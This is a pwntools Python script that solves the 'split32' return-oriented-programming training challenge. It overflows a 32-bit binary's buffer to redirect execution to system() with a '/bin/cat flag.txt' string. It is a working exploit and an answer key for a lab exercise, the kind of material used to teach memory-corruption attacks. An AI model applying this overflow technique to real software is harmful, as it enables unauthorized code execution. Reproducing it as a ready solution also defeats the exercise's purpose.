from pwn import *

context.update(os='linux', arch='i386', log_level='debug')
io = process("./split32")

# useful function
system       = 0x804861a

# useful address
magic_string = 0x804a030 # /bin/cat flag.txt


def gen_payload(size: int) -> bytes:
    offset = cyclic_find("laaa", n=4)
    log.info(f"offset: {offset}")

    payload = b""
    payload += b"A" * offset
    payload += p32(system)
    payload += p32(magic_string)
    payload += b"C" * (size - len(payload))

    return payload


io.sendlineafter(b"> ", gen_payload(size=80))
io.interactive()
